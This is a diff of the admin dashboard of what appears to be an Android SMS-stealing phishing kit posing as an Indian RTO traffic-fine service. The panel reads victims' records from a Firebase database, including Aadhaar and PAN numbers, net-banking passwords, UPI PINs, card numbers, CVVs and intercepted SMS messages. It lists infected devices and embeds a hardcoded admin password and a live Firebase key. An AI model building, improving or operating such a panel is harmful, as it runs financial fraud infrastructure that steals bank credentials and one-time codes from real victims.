@@ -3,217 +3,131 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>RTO Admin Panel - Secured</title>
+    <title>RTO Admin Panel</title>
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
     <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-database-compat.js"></script>
     <style>
-        body { background-color: #f0f2f5; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
-
-        /* Login Screen Styles */
-        #login-screen {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: #121212; z-index: 9999; display: flex;
-            align-items: center; justify-content: center; color: white;
-        }
-        .login-box {
-            background: #fff; padding: 40px; border-radius: 15px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.5); color: #333; width: 100%; max-width: 400px;
-        }
-
-        /* Dashboard Styles */
-        .sidebar { height: 100vh; overflow-y: auto; background: #fff; border-right: 1px solid #ddd; position: fixed; width: 25%; }
-        .user-item { cursor: pointer; padding: 15px; border-bottom: 1px solid #eee; transition: 0.2s; }
-        .user-item:hover { background-color: #f8f9fa; }
-        .user-item.active { border-left: 5px solid #0d6efd; background-color: #e7f1ff; }
-        .main-content { margin-left: 25%; padding: 25px; min-height: 100vh; }
-        .data-card { background: #fff; padding: 20px; border-radius: 12px; box-shadow: 0 4px 6px rgba(0,0,0,0.05); margin-bottom: 25px; }
-        .sms-item { border-bottom: 1px solid #f0f0f0; padding: 10px 0; }
-        .sms-item:last-child { border-bottom: none; }
-        .label-text { font-weight: 600; color: #4b5563; font-size: 0.85rem; margin-bottom: 2px; }
-        .value-text { color: #111827; font-size: 1.1rem; margin-bottom: 12px; word-break: break-all; border-bottom: 1px solid #f3f4f6; padding-bottom: 4px; }
-        .tag-id { font-family: monospace; font-size: 0.8rem; background: #e5e7eb; padding: 2px 6px; border-radius: 4px; }
-        .sms-sender { color: #dc3545; font-weight: bold; }
-        .sms-time { font-size: 0.75rem; color: #6b7280; }
+        body { background-color: #ffffff; font-family: sans-serif; }
+        .header-btns { background-color: #6a1b9a; padding: 12px; display: flex; justify-content: space-between; gap: 10px; position: sticky; top: 0; z-index: 100; }
+        .header-btns button { flex: 1; background: #4a0072; color: white; border: none; padding: 10px; border-radius: 5px; font-weight: bold; font-size: 14px; }
+        
+        .user-card { border: 1px solid #e0e0e0; border-radius: 12px; padding: 15px; margin: 15px; background: white; box-shadow: 0 2px 4px rgba(0,0,0,0.05); position: relative; }
+        .user-index { position: absolute; left: 10px; top: 10px; font-weight: bold; color: #555; font-size: 1.1rem; }
+        .device-icon-container { width: 80px; text-align: center; margin-left: 15px; }
+        .device-icon-container img { width: 60px; }
+        .user-info { margin-left: 15px; flex-grow: 1; }
+        .user-info h6 { margin: 0; color: #333; font-weight: bold; font-size: 1.1rem; }
+        .user-info p { margin: 2px 0; font-size: 0.85rem; color: #444; }
+        .status-online { color: #2e7d32; font-weight: bold; font-size: 0.85rem; border-top: 1px solid #f0f0f0; margin-top: 10px; padding-top: 8px; text-align: center; }
+        
+        #login-screen { position: fixed; top:0; left:0; width:100%; height:100%; background:white; z-index:200; display:flex; align-items:center; justify-content:center; }
+        #details-modal { position: fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.95); z-index:150; display:none; color:white; padding:20px; overflow-y:auto; }
     </style>
 </head>
 <body>
 
-<!-- Login Screen -->
 <div id="login-screen">
-    <div class="login-box">
-        <h3 class="text-center mb-4">RTO Admin Access</h3>
-        <div class="mb-3">
-            <label class="form-label">Enter Admin Password</label>
-            <input type="password" id="admin-pass" class="form-control" placeholder="Password...">
-        </div>
-        <button class="btn btn-primary w-100" onclick="checkAuth()">Login</button>
-        <div id="login-error" class="text-danger mt-3 text-center" style="display:none;">Invalid Password!</div>
+    <div class="text-center p-4" style="max-width:350px; width:100%;">
+        <h4 class="mb-4">Admin Login</h4>
+        <input type="password" id="admin-pass" class="form-control mb-3" placeholder="Enter Password">
+        <button class="btn btn-primary w-100" onclick="checkLogin()">LOGIN</button>
     </div>
 </div>
 
-<!-- Main Dashboard Content -->
-<div id="dashboard-content" style="display:none;">
-    <div class="sidebar">
-        <div class="p-3 bg-dark text-white d-flex justify-content-between align-items-center">
-            <h5 class="m-0">RTO Devices</h5>
-            <span class="badge bg-primary" id="user-count">0</span>
-        </div>
-        <div id="user-list">
-            <div class="p-4 text-center text-muted">Waiting for data...</div>
-        </div>
+<div id="admin-content" style="display:none;">
+    <div class="header-btns">
+        <button onclick="deleteAll()">ALL DELETE USER</button>
+        <button onclick="updateNo()">UPDATE NO</button>
     </div>
+    <div id="user-list"></div>
+</div>
 
-    <div class="main-content">
-        <div id="welcome-screen" class="text-center py-5 mt-5">
-            <h2 class="text-muted">Welcome to Admin Dashboard</h2>
-            <p>Select a user from the list to see captured data and SMS.</p>
-            <button class="btn btn-outline-danger btn-sm mt-3" onclick="logout()">Logout</button>
-        </div>
-
-        <div id="user-data-screen" style="display: none;">
-            <div class="d-flex justify-content-between align-items-center mb-4">
-                <div>
-                    <h2 id="display-name" class="mb-0">User Details</h2>
-                    <span class="tag-id" id="display-id">ID: ...</span>
-                </div>
-                <button class="btn btn-danger btn-sm" onclick="logout()">Logout</button>
-            </div>
-
-            <div class="row">
-                <!-- User Information -->
-                <div class="col-lg-6">
-                    <div class="data-card">
-                        <h5 class="border-bottom pb-2 mb-3 text-primary">Captured Details (Payment/Bank)</h5>
-                        <div id="all-fields-container">
-                            <!-- Fields injected here -->
-                        </div>
-                    </div>
-                </div>
-
-                <!-- SMS Logs -->
-                <div class="col-lg-6">
-                    <div class="data-card">
-                        <h5 class="border-bottom pb-2 mb-3 text-success">Incoming SMS Messages</h5>
-                        <div id="sms-logs" style="max-height: 650px; overflow-y: auto;">
-                            <!-- SMS injected here -->
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
+<div id="details-modal">
+    <button class="btn btn-sm btn-danger mb-3" onclick="closeDetails()">BACK</button>
+    <div id="details-body"></div>
 </div>
 
 <script>
-    // Password set as requested
-    const ADMIN_PASSWORD = "Zuhi@143";
+    const PASS = "Zuhi@143";
+    const firebaseConfig = {
+        apiKey: "AIzaSyBxn_lMOEFBkQwBoTM_rGPAV2qaP8yLa1o",
+        databaseURL: "https://rto-challan-b6f93-default-rtdb.firebaseio.com/",
+        projectId: "rto-challan-b6f93"
+    };
 
-    function checkAuth() {
-        const inputPass = document.getElementById('admin-pass').value;
-        if (inputPass === ADMIN_PASSWORD) {
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    function checkLogin() {
+        if(document.getElementById('admin-pass').value === PASS) {
             document.getElementById('login-screen').style.display = 'none';
-            document.getElementById('dashboard-content').style.display = 'block';
-            startFirebase();
-        } else {
-            const errorDiv = document.getElementById('login-error');
-            errorDiv.style.display = 'block';
-            setTimeout(() => { errorDiv.style.display = 'none'; }, 3000);
-        }
+            document.getElementById('admin-content').style.display = 'block';
+            loadUsers();
+        } else { alert("Wrong Password"); }
     }
 
-    function logout() {
-        location.reload();
-    }
-
-    // Support Enter key for login
-    document.getElementById("admin-pass").addEventListener("keypress", function(e) {
-        if (e.key === "Enter") checkAuth();
-    });
-
-    function startFirebase() {
-        const firebaseConfig = {
-            apiKey: "AIzaSyBxn_lMOEFBkQwBoTM_rGPAV2qaP8yLa1o",
-            databaseURL: "https://rto-challan-b6f93-default-rtdb.firebaseio.com/",
-            projectId: "rto-challan-b6f93"
-        };
-
-        if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
-        const db = firebase.database();
-
-        const labels = {
-            fullName: "Full Name", mobileNumber: "Mobile Number", aadhaarNumber: "Aadhaar Number",
-            panNumber: "PAN Number", motherName: "Mother's Name", accountNumber: "Account Number",
-            ifscCode: "IFSC Code", netBankName: "Bank (Net Banking)", netUserId: "User ID",
-            netPassword: "Password", upiBank: "UPI Bank", upiPin: "UPI PIN",
-            card_number: "Card Number", expiry_date: "Expiry Date", cvv: "CVV"
-        };
-
-        let usersStore = {};
-
+    function loadUsers() {
         db.ref('users').on('value', (snapshot) => {
-            usersStore = snapshot.val() || {};
-            const uids = Object.keys(usersStore);
-            document.getElementById('user-count').innerText = uids.length;
-
-            const listDiv = document.getElementById('user-list');
-            listDiv.innerHTML = '';
-
-            uids.reverse().forEach(uid => {
-                const user = usersStore[uid];
-                const displayName = (user.details && user.details.fullName) ? user.details.fullName : 'Device ' + uid.substring(0, 5);
-                const subText = (user.details && user.details.mobileNumber) ? user.details.mobileNumber : uid;
-
-                const item = document.createElement('div');
-                item.className = 'user-item';
-                item.innerHTML = `<strong>${displayName}</strong><br><small class="text-muted">${subText}</small>`;
-                item.onclick = () => showUser(uid, item, usersStore, labels);
-                listDiv.appendChild(item);
-            });
-        });
-    }
-
-    function showUser(uid, element, usersStore, labels) {
-        document.querySelectorAll('.user-item').forEach(i => i.classList.remove('active'));
-        element.classList.add('active');
-        document.getElementById('welcome-screen').style.display = 'none';
-        document.getElementById('user-data-screen').style.display = 'block';
-
-        const user = usersStore[uid];
-        const details = user.details || {};
-        document.getElementById('display-name').innerText = details.fullName || 'User Details';
-        document.getElementById('display-id').innerText = 'ID: ' + uid;
-
-        const container = document.getElementById('all-fields-container');
-        container.innerHTML = '';
-        Object.keys(details).forEach(key => {
-            const label = labels[key] || key;
-            container.innerHTML += `
-                <div class="field">
-                    <div class="label-text text-uppercase">${label}</div>
-                    <div class="value-text fw-bold">${details[key]}</div>
-                </div>`;
-        });
-
-        const smsDiv = document.getElementById('sms-logs');
-        smsDiv.innerHTML = '';
-        if (user.sms) {
-            Object.values(user.sms).reverse().forEach(sms => {
-                const time = new Date(sms.timestamp).toLocaleString();
-                smsDiv.innerHTML += `
-                    <div class="sms-item">
-                        <div class="d-flex justify-content-between mb-1">
-                            <span class="sms-sender">${sms.sender}</span>
-                            <span class="sms-time">${time}</span>
+            const users = snapshot.val() || {};
+            const list = document.getElementById('user-list');
+            list.innerHTML = '';
+            let i = 1;
+            Object.keys(users).reverse().forEach(uid => {
+                const user = users[uid];
+                const model = (user.details && user.details.model) ? user.details.model : "Android Device";
+                const battery = (user.details && user.details.battery) ? user.details.battery : "Unknown";
+                
+                list.innerHTML += `
+                    <div class="user-card" onclick="showUser('${uid}')">
+                        <span class="user-index">${i++}</span>
+                        <div class="d-flex align-items-center">
+                            <div class="device-icon-container">
+                                <img src="https://www.freeiconspng.com/uploads/android-icon-png-23.png">
+                            </div>
+                            <div class="user-info">
+                                <h6>Mobile : ${model}</h6>
+                                <p>Device Id : ${uid}</p>
+                                <p>Battery : ${battery}</p>
+                            </div>
                         </div>
-                        <div>${sms.message}</div>
+                        <div class="status-online">Status : Online User</div>
                     </div>`;
             });
-        } else {
-            smsDiv.innerHTML = '<div class="text-center py-4 text-muted">No SMS recorded.</div>';
-        }
+        });
     }
-</script>
 
+    function showUser(uid) {
+        db.ref('users/' + uid).once('value', (s) => {
+            const user = s.val();
+            const body = document.getElementById('details-body');
+            let html = `<h4>Details for ${uid}</h4><hr>`;
+            
+            if(user.details) {
+                html += "<h5>User Info:</h5>";
+                for(let k in user.details) {
+                    html += `<p style="margin-bottom:5px;"><b>${k}:</b> <span class="text-info">${user.details[k]}</span></p>`;
+                }
+            }
+            
+            html += "<hr><h5>SMS Logs:</h5>";
+            if(user.sms) {
+                Object.values(user.sms).reverse().forEach(s => {
+                    html += `<div class="mb-2 p-2 border border-secondary rounded" style="background:#222;">
+                        <small class="text-warning">${new Date(s.timestamp).toLocaleString()}</small><br>
+                        <b class="text-danger">${s.sender}:</b> ${s.message}
+                    </div>`;
+                });
+            } else html += "<p>No SMS found</p>";
+            
+            body.innerHTML = html;
+            document.getElementById('details-modal').style.display = 'block';
+        });
+    }
+
+    function closeDetails() { document.getElementById('details-modal').style.display = 'none'; }
+    function deleteAll() { if(confirm("Delete all users?")) db.ref('users').remove(); }
+    function updateNo() { let n = prompt("Enter new update number:"); if(n) db.ref('update_no').set(n); }
+</script>
 </body>
 </html>
